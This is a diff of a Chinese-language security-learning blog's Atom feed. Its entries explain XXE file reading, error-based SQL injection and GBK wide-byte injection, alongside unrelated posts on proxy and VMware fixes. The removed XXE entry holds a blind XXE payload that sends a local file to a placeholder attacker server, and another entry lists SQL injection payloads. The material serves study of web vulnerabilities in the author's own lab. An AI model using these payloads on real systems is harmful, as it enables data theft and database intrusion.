       &lt;h3 id=&quot;1-最简单的SQL注入&quot;&gt;&lt;a href=&quot;#1-最简单的SQL注入&quot; class=&quot;headerlink&quot; title=&quot;1.最简单的SQL注入&quot;&gt;&lt;/a&gt;1.最简单的SQL注入&lt;/h3&gt;&lt;h3 id=&quot;Tips题目里有简单提示&quot;&gt;&lt;a href=&quot;#Tips题目里有简单提示&quot; class=&quot;headerlink&quot; title=&quot;Tips题目里有简单提示&quot;&gt;&lt;/a&gt;Tips题目里有简单提示&lt;/h3&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>chrome 代理设置ss(ssr)</title>
+    <link href="http://yoursite.com/2018/07/06/%E5%85%B3%E4%BA%8ESSR%E9%85%8D%E7%BD%AE/"/>
+    <id>http://yoursite.com/2018/07/06/关于SSR配置/</id>
+    <published>2018-07-06T05:24:35.617Z</published>
+    <updated>2018-07-06T10:36:53.625Z</updated>
+    
+    <content type="html"><![CDATA[<p>参考链接:<a href="https://www.jianshu.com/p/4c0553dbc970" target="_blank" rel="noopener">https://www.jianshu.com/p/4c0553dbc970</a><br><a id="more"></a></p><p>先看这个吧，害怕三连.jpg</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;参考链接:&lt;a href=&quot;https://www.jianshu.com/p/4c0553dbc970&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.jianshu.com/p/4c0553dbc970&lt;/a&gt;&lt;br&gt;
     
     </summary>
     
@@ -304,62 +341,6 @@
   </entry>
   
   <entry>
-    <title>xxe漏洞的复现解析</title>
-    <link href="http://yoursite.com/2018/07/06/xxe%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
-    <id>http://yoursite.com/2018/07/06/xxe漏洞复现/</id>
-    <published>2018-07-06T05:24:35.617Z</published>
-    <updated>2018-07-06T10:44:20.273Z</updated>
-    
-    <content type="html"><![CDATA[<p>参考链接:<a href="https://www.jianshu.com/p/163879fc1018" target="_blank" rel="noopener">https://www.jianshu.com/p/163879fc1018</a></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>当XML文件中出现关键字”SYSTEM”定义的“实体”（DOCTYPE头部标签中会呈现），便可通过XML文件中定义的’实体’ , 访问本地或者远程的内容。这时候，XML解析器在SYSTEM的作用下从URI中读取内容，并允许它在XML文档中被替换，从而造成外部实体攻击。此时，Web应用如果产生数据回显，则会将URL中的数据呈现在应用界面上。<br>而如果Web端注意到这一点，没有设置回显，那么攻击者可以将数据通过外数据通道发送到攻击者服务器，从而达到攻击效果。<br><a id="more"></a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这里用phpstudy以及自己的服务器进行搭建环境</p><p>首先本地根目录下写两个文件</p><p>test.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$xml=&lt;&lt;&lt;EOF</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line"> &lt;!ENTITY milin SYSTEM &quot;file:///D:/phpStudy/PHPTutorial/WWW/pwd.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;a&gt;&amp;milin;&lt;/a&gt;</span><br><span class="line">EOF;</span><br><span class="line">$data = simplexml_load_string($xml);</span><br><span class="line">print_r($data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>pwd.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">21212121(任意都可以,假设这个文本是攻击者想要的内容)</span><br></pre></td></tr></table></figure><ul><li>&lt;&lt;&lt;EOF ….. EOF; 这中间不对敏感字符进行转义</li><li>simplexml_load_string()函数:转换形式良好的 XML 字符串为 SimpleXMLElement 对象，然后输出对象的键和元素</li></ul><p>然后访问本地文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/test.php</span><br></pre></td></tr></table></figure></p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/%28X5A%25L5JMQQ5@HX4K%5D%7DBP0M.png" alt="image"></p><p>可以看到pwd.txt的文件成功地被读取了出来</p><h2 id="无回显的情况"><a href="#无回显的情况" class="headerlink" title="无回显的情况"></a>无回显的情况</h2><p>但是如果没有回显，即没有print_r($data),这样就没法读取到pwd.txt了，这里的办法是将回显数据通过外数据通道发送到另一个服务器</p><p>这里联系自己的服务器进行攻击</p><p>test.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$xml=&lt;&lt;&lt;EOF</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line"> &lt;!ENTITY % file SYSTEM &quot;file:///D:/phpStudy/PHPTutorial/WWW/pwd.txt&quot;&gt;</span><br><span class="line"> &lt;!ENTITY % xml SYSTEM &quot;http://服务器_IP/milin.xml&quot;&gt;</span><br><span class="line">%xml;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line">EOF;</span><br><span class="line">$data = simplexml_load_string($xml);</span><br><span class="line">print_r($data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>然后在自己的服务器放个milin.xml文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://服务器_IP/get.php?file=%file;&apos;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure></p><p>然后为了接受这个文件的数据，再构造一个get.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">file_put_contents(&quot;key.txt&quot;, $_GET[&apos;file&apos;]) ; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>最后访问URL模拟攻击:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/test.php</span><br></pre></td></tr></table></figure></p><p>会发现在自己的服务器目录生成了一个key.txt,里面内容为你本地的pwd.txt</p><h2 id="遇到的一些无法复现的问题"><a href="#遇到的一些无法复现的问题" class="headerlink" title="遇到的一些无法复现的问题"></a>遇到的一些无法复现的问题</h2><p><img src="http://p1vrkwaxt.bkt.clouddn.com/7F6003B4ACBF683F4BE602542DAD0CF6.png" alt="image"></p><p>我也遇到了这个函数的问题，但切换版本总是一样结果，后来把phpstudy删了重装结果好了= =</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;参考链接:&lt;a href=&quot;https://www.jianshu.com/p/163879fc1018&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.jianshu.com/p/163879fc1018&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;当XML文件中出现关键字”SYSTEM”定义的“实体”（DOCTYPE头部标签中会呈现），便可通过XML文件中定义的’实体’ , 访问本地或者远程的内容。这时候，XML解析器在SYSTEM的作用下从URI中读取内容，并允许它在XML文档中被替换，从而造成外部实体攻击。此时，Web应用如果产生数据回显，则会将URL中的数据呈现在应用界面上。&lt;br&gt;而如果Web端注意到这一点，没有设置回显，那么攻击者可以将数据通过外数据通道发送到攻击者服务器，从而达到攻击效果。&lt;br&gt;
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>VM一直多次黑屏问题</title>
-    <link href="http://yoursite.com/2018/07/06/vmheipeing/"/>
-    <id>http://yoursite.com/2018/07/06/vmheipeing/</id>
-    <published>2018-07-06T05:24:35.601Z</published>
-    <updated>2018-07-06T10:43:43.572Z</updated>
-    
-    <content type="html"><![CDATA[<h4 id="vm黑屏解决方案"><a href="#vm黑屏解决方案" class="headerlink" title="vm黑屏解决方案"></a>vm黑屏解决方案</h4><p>本人是游戏本，打开vmware经常报错套接次数问题，重启服务后以后还是会出现问题<br>后来百度一下找到解决方案<br><br><a id="more"></a><br><a href="https://jingyan.baidu.com/article/84b4f565bd1da060f6da3235.html?qq-pf-to=pcqq.group" target="_blank" rel="noopener">黑屏解决方案网址</a><br><br><br>简单来说以管理员身份运行cmd，输入如下命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh winsock reset</span><br></pre></td></tr></table></figure></p><p>重新启动计算机即可解决</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h4 id=&quot;vm黑屏解决方案&quot;&gt;&lt;a href=&quot;#vm黑屏解决方案&quot; class=&quot;headerlink&quot; title=&quot;vm黑屏解决方案&quot;&gt;&lt;/a&gt;vm黑屏解决方案&lt;/h4&gt;&lt;p&gt;本人是游戏本，打开vmware经常报错套接次数问题，重启服务后以后还是会出现问题&lt;br&gt;后来百度一下找到解决方案&lt;br&gt;&lt;br&gt;
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>SQL 报错注入</title>
-    <link href="http://yoursite.com/2018/07/06/sql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
-    <id>http://yoursite.com/2018/07/06/sql报错注入/</id>
-    <published>2018-07-06T05:24:35.601Z</published>
-    <updated>2018-07-06T10:43:14.889Z</updated>
-    
-    <content type="html"><![CDATA[<p>参考链接:<a href="http://www.bugku.com/forum.php?mod=viewthread&amp;tid=93&amp;extra=page%3D1%26filter%3Dtypeid%26typeid%3D26" target="_blank" rel="noopener">SQL报错注入十二个函数</a></p><h2 id="SQL报错注入的十二个函数"><a href="#SQL报错注入的十二个函数" class="headerlink" title="SQL报错注入的十二个函数"></a>SQL报错注入的十二个函数</h2><a id="more"></a><h3 id="0x01-floor报错"><a href="#0x01-floor报错" class="headerlink" title="0x01 floor报错"></a>0x01 floor报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure><h3 id="0x02-ExtractValue报错"><a href="#0x02-ExtractValue报错" class="headerlink" title="0x02 ExtractValue报错"></a>0x02 ExtractValue报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</span><br></pre></td></tr></table></figure><h3 id="0x03-UpdateXml报错"><a href="#0x03-UpdateXml报错" class="headerlink" title="0x03 UpdateXml报错"></a>0x03 UpdateXml报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=(updatexml(1,concat(0x3a,(select user())),1))</span><br></pre></td></tr></table></figure><h3 id="0x04-NAME-CONST报错"><a href="#0x04-NAME-CONST报错" class="headerlink" title="0x04 NAME_CONST报错"></a>0x04 NAME_CONST报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exists(select*from (select*from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)</span><br></pre></td></tr></table></figure><h3 id="0x05-join报错"><a href="#0x05-join报错" class="headerlink" title="0x05 join报错"></a>0x05 join报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from(select * from mysql.user ajoin mysql.user b)c;</span><br></pre></td></tr></table></figure><h3 id="0x06-exp报错"><a href="#0x06-exp报错" class="headerlink" title="0x06 exp报错"></a>0x06 exp报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exp(~(select * from (select user () ) a) );</span><br></pre></td></tr></table></figure><h3 id="0x07-GeometryCollection-报错"><a href="#0x07-GeometryCollection-报错" class="headerlink" title="0x07 GeometryCollection()报错"></a>0x07 GeometryCollection()报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and GeometryCollection(()select *from(select user () )a)b );</span><br></pre></td></tr></table></figure><h3 id="0x08-polygon-报错"><a href="#0x08-polygon-报错" class="headerlink" title="0x08 polygon()报错"></a>0x08 polygon()报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and polygon (()select * from(select user ())a)b );</span><br></pre></td></tr></table></figure><h3 id="0x09-multipoint-报错"><a href="#0x09-multipoint-报错" class="headerlink" title="0x09 multipoint()报错"></a>0x09 multipoint()报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and multipoint (()select * from(select user() )a)b );</span><br></pre></td></tr></table></figure><h3 id="0x10-multlinestring-报错"><a href="#0x10-multlinestring-报错" class="headerlink" title="0x10 multlinestring()报错"></a>0x10 multlinestring()报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and multlinestring (()select * from(selectuser () )a)b );</span><br></pre></td></tr></table></figure><h3 id="0x11-multpolygon-报错"><a href="#0x11-multpolygon-报错" class="headerlink" title="0x11 multpolygon()报错"></a>0x11 multpolygon()报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and multpolygon (()select * from(selectuser () )a)b );</span><br></pre></td></tr></table></figure><h3 id="0x12-linestring-报错"><a href="#0x12-linestring-报错" class="headerlink" title="0x12 linestring()报错"></a>0x12 linestring()报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and linestring (()select * from(select user() )a)b );</span><br></pre></td></tr></table></figure><p>bugku上有个很好的测试平台 <a href="http://www.bugku.com/thread-152-1-1.html" target="_blank" rel="noopener">http://www.bugku.com/thread-152-1-1.html</a></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;参考链接:&lt;a href=&quot;http://www.bugku.com/forum.php?mod=viewthread&amp;amp;tid=93&amp;amp;extra=page%3D1%26filter%3Dtypeid%26typeid%3D26&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;SQL报错注入十二个函数&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id=&quot;SQL报错注入的十二个函数&quot;&gt;&lt;a href=&quot;#SQL报错注入的十二个函数&quot; class=&quot;headerlink&quot; title=&quot;SQL报错注入的十二个函数&quot;&gt;&lt;/a&gt;SQL报错注入的十二个函数&lt;/h2&gt;
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
     <title>基于约束的SQL攻击</title>
     <link href="http://yoursite.com/2018/07/06/SQL%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB/"/>
     <id>http://yoursite.com/2018/07/06/SQL约束攻击/</id>
@@ -381,17 +362,35 @@
   </entry>
   
   <entry>
-    <title>MySql模糊查询</title>
-    <link href="http://yoursite.com/2018/07/06/sqlmohu/"/>
-    <id>http://yoursite.com/2018/07/06/sqlmohu/</id>
+    <title>sql宽字节注入原理</title>
+    <link href="http://yoursite.com/2018/07/06/sqlkuanzijie/"/>
+    <id>http://yoursite.com/2018/07/06/sqlkuanzijie/</id>
     <published>2018-07-06T05:24:35.601Z</published>
-    <updated>2018-07-06T10:43:36.538Z</updated>
+    <updated>2018-07-06T10:43:25.315Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="MySql模糊查询的五种用法"><a href="#MySql模糊查询的五种用法" class="headerlink" title="MySql模糊查询的五种用法"></a>MySql模糊查询的五种用法</h2><h3 id="Mysql模糊查询用法之一-‘-’"><a href="#Mysql模糊查询用法之一-‘-’" class="headerlink" title="Mysql模糊查询用法之一    ‘%’"></a>Mysql模糊查询用法之一    ‘%’</h3><p>%：表示任意0个或多个字符。可匹配任意类型和长度的字符，有些情况下若是中文，请使用两个百分号（%%）表示(如果只有%表示不匹配,仍正确);<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM [user] WHERE u_name LIKE &apos;%三%&apos;</span><br></pre></td></tr></table></figure></p><p>将会把u_name为“张三”，“张猫三”、“三脚猫”，“唐三藏”等等有“三”的记录全找出来。<br>需要找出u_name中既有“三”又有“猫”的记录，请使用and条件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM [user] WHERE u_name LIKE &apos;%三%&apos; AND u_name LIKE &apos;%猫%&apos;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM [user] WHERE u_name LIKE &apos;%三%猫%&apos;</span><br></pre></td></tr></table></figure><p>虽然能搜索出“三脚猫”，但不能搜索出符合条件的“张猫三”。</p><h3 id="Mysql模糊查询用法之二-‘-’"><a href="#Mysql模糊查询用法之二-‘-’" class="headerlink" title="Mysql模糊查询用法之二   ‘_’"></a>Mysql模糊查询用法之二   ‘_’</h3><p>_： 表示任意单个字符。匹配单个任意字符，它常用来限制表达式的字符长度语句;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM [user] WHERE u_name LIKE &apos;_三_&apos;</span><br></pre></td></tr></table></figure><p>只找出“唐三藏”这样u_name为三个字且中间一个字是“三”的；</p><h3 id="Mysql模糊查询用法之三-‘-’"><a href="#Mysql模糊查询用法之三-‘-’" class="headerlink" title="Mysql模糊查询用法之三    ‘[ ]’"></a>Mysql模糊查询用法之三    ‘[ ]’</h3><p>[ ]：表示括号内所列字符中的一个（类似正则表达式）。指定一个字符、字符串或范围，要求所匹配对象为它们中的任一个。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM [user] WHERE u_name LIKE &apos;[张李王]三&apos;</span><br></pre></td></tr></table></figure><p>会找出“张三”、“李三”、“王三”（而不是“张李王三”）;<br>如 [ ] 内有一系列字符（01234、abcde之类的）则可略写为“0-4”、“a-e” </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM [user] WHERE u_name LIKE &apos;老[1-9]&apos;</span><br></pre></td></tr></table></figure><p>将找出“老1”、“老2”、……、“老9”；</p><h3 id="Mysql模糊查询用法之四-‘-‘"><a href="#Mysql模糊查询用法之四-‘-‘" class="headerlink" title="Mysql模糊查询用法之四    ‘[^ ] ‘"></a>Mysql模糊查询用法之四    ‘[^ ] ‘</h3><p>[^ ] ：表示不在括号所列之内的单个字符。其取值和 [] 相同，但它要求所匹配对象为指定字符以外的任一个字符。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM [user] WHERE u_name LIKE &apos;[^张李王]三&apos;</span><br></pre></td></tr></table></figure><p>将找出不姓“张”、“李”、“王”的“赵三”、“孙三”等;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM [user] WHERE u_name LIKE &apos;老[^1-4]&apos;;</span><br></pre></td></tr></table></figure><p>将排除“老1”到“老4”，寻找“老5”、“老6”、……</p><h3 id="Mysql模糊查询用法之五-查询内容包含通配符时"><a href="#Mysql模糊查询用法之五-查询内容包含通配符时" class="headerlink" title="Mysql模糊查询用法之五    查询内容包含通配符时"></a>Mysql模糊查询用法之五    查询内容包含通配符时</h3><p>由于通配符的缘故，导致我们查询特殊字符“%”、“_”、“[”的语句无法正常实现，而把特殊字符用“[ ]”括起便可正常查询。据此我们写出以下函数:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function sqlencode(str) str=replace(str,&quot;&apos;;&quot;,&quot;&apos;;&apos;;&quot;) </span><br><span class="line">str=replace(str,&quot;[&quot;,&quot;[[]&quot;) &apos;;此句一定要在最先 str=replace(str,&quot;_&quot;,&quot;[_]&quot;) str=replace(str,&quot;%&quot;,&quot;[%]&quot;) sqlencode=str end function</span><br></pre></td></tr></table></figure>]]></content>
+    <content type="html"><![CDATA[<h3 id="sql宽字节注入原理"><a href="#sql宽字节注入原理" class="headerlink" title="sql宽字节注入原理"></a>sql宽字节注入原理</h3><p>在magic_quotes_gpc=On的情况下，提交的参数中如果带有单引号’，就会被自动转义\’，使很多注入攻击无效.<br><a id="more"></a><br>GBK 一个汉字用两个字节表示<br><br>ASCII编码 占用一个字节<br><br>PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集.</p><p>GBK双字节编码：一个汉字用两个字节表示，首字节对应0×81-0xFE，尾字节对应0×40-0xFE（除0×7F），刚好涵盖了转义符号\对应的编码0×5C。</p><p>0xD50×5C 对应了汉字“诚”，URL编码用百分号加字符的16进制编码表示字符，于是 %d5%5c 经URL解码后为“诚”。</p><h3 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h3><p>访问 <a href="http://www.2cto.com" target="_blank" rel="noopener">http://www.2cto.com</a> /test.php?username=test%d5′%20or%201=1%23&amp;pwd=test</p><p>经过浏览器编码，username参数值为(单引号的编码0×27)</p><p>username=test%d5%27%20or%201=1%23</p><p>经过php的url解码</p><p>username=test 0xd5 0×27 0×20 or 0×20 1=1 0×23 (为了便于阅读，在字符串与16进制编码之间加了空格)</p><p>经过PHP的GPC自动转义变成(单引号0×27被转义成\’对应的编码0×5c0×27)：</p><p>username=test 0xd5 0×5c 0×27 0×20 or 0×20 1=1 0×23</p><p>因为在数据库初始化连接的时候SET NAMES ‘gbk’，0xd50×5c解码后为诚，0×27解码为’，0×20为空格，0×23为mysql的注释符#</p><p>上面的SQL语句最终为： SELECT * FROM user WHERE username=’test诚’ or 1=1#’ and password=’test’;</p><p>注释符#后面的字符串已经无效，等价于</p><p>SELECT * FROM user WHERE username=’test诚’ or 1=1;</p><p>条件变成永真，成功注入。</p><h3 id="sql宽字节注入方法"><a href="#sql宽字节注入方法" class="headerlink" title="sql宽字节注入方法"></a>sql宽字节注入方法</h3><p>输入%df和函数执行添加的%5C，被合并成%df%5C。由于GBK是两字节，这个%df%5C被MYSQL识别为GBK。导致本应的%df\变成%df%5C。%df%5C在GBK编码中没有对应，所以被当成无效字符。</p><p>　　%DF’ ：会被PHP当中的addslashes函数转义为“%DF\’” ，“\”既URL里的“%5C”，那么也就是说，“%DF’”会被转成“%DF%5C%27”倘若网站的字符集是GBK，MYSQL使用的编码也是GBK的话，就会认为“%DF%5C%27”是一个宽字符。也就是“縗’”</p><p><a href="https://www.2cto.com/article/201209/153283.html" target="_blank" rel="noopener">sql宽字节原理</a></p><p><a href="https://www.cnblogs.com/xishaonian/p/6063961.html" target="_blank" rel="noopener">sql宽字节注入具体解释</a></p><p><a href="http://www.cnblogs.com/lcamry/articles/5625276.html" target="_blank" rel="noopener">sql宽字节注入详解</a></p>]]></content>
     
     <summary type="html">
     
-      &lt;h2 id=&quot;MySql模糊查询的五种用法&quot;&gt;&lt;a href=&quot;#MySql模糊查询的五种用法&quot; class=&quot;headerlink&quot; title=&quot;MySql模糊查询的五种用法&quot;&gt;&lt;/a&gt;MySql模糊查询的五种用法&lt;/h2&gt;&lt;h3 id=&quot;Mysql模糊查询用法之一-‘-’&quot;&gt;&lt;a href=&quot;#Mysql模糊查询用法之一-‘-’&quot; class=&quot;headerlink&quot; title=&quot;Mysql模糊查询用法之一    ‘%’&quot;&gt;&lt;/a&gt;Mysql模糊查询用法之一    ‘%’&lt;/h3&gt;&lt;p&gt;%：表示任意0个或多个字符。可匹配任意类型和长度的字符，有些情况下若是中文，请使用两个百分号（%%）表示(如果只有%表示不匹配,仍正确);&lt;br&gt;
+      &lt;h3 id=&quot;sql宽字节注入原理&quot;&gt;&lt;a href=&quot;#sql宽字节注入原理&quot; class=&quot;headerlink&quot; title=&quot;sql宽字节注入原理&quot;&gt;&lt;/a&gt;sql宽字节注入原理&lt;/h3&gt;&lt;p&gt;在magic_quotes_gpc=On的情况下，提交的参数中如果带有单引号’，就会被自动转义\’，使很多注入攻击无效.&lt;br&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>VM一直多次黑屏问题</title>
+    <link href="http://yoursite.com/2018/07/06/vmheipeing/"/>
+    <id>http://yoursite.com/2018/07/06/vmheipeing/</id>
+    <published>2018-07-06T05:24:35.601Z</published>
+    <updated>2018-07-06T10:43:43.572Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="vm黑屏解决方案"><a href="#vm黑屏解决方案" class="headerlink" title="vm黑屏解决方案"></a>vm黑屏解决方案</h4><p>本人是游戏本，打开vmware经常报错套接次数问题，重启服务后以后还是会出现问题<br>后来百度一下找到解决方案<br><br><a id="more"></a><br><a href="https://jingyan.baidu.com/article/84b4f565bd1da060f6da3235.html?qq-pf-to=pcqq.group" target="_blank" rel="noopener">黑屏解决方案网址</a><br><br><br>简单来说以管理员身份运行cmd，输入如下命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh winsock reset</span><br></pre></td></tr></table></figure></p><p>重新启动计算机即可解决</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;vm黑屏解决方案&quot;&gt;&lt;a href=&quot;#vm黑屏解决方案&quot; class=&quot;headerlink&quot; title=&quot;vm黑屏解决方案&quot;&gt;&lt;/a&gt;vm黑屏解决方案&lt;/h4&gt;&lt;p&gt;本人是游戏本，打开vmware经常报错套接次数问题，重启服务后以后还是会出现问题&lt;br&gt;后来百度一下找到解决方案&lt;br&gt;&lt;br&gt;
     
     </summary>
     
